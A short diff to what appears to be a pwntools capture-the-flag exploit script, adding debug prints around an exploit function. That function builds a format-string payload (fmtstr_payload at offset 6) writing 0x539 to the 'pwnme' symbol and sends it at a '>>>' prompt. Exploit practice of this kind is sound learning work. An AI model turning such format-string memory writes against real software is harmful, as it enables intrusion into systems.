@@ -63,7 +63,9 @@ def view(p, index):
     return ret
 
 def exploit(io,e):
+    print(e.sym.pwnme)
     payload = fmtstr_payload(6, {e.sym.pwnme: 0x539}, write_size="int")
+    print(payload)
 
     sla(io, b">>>", payload) 
 
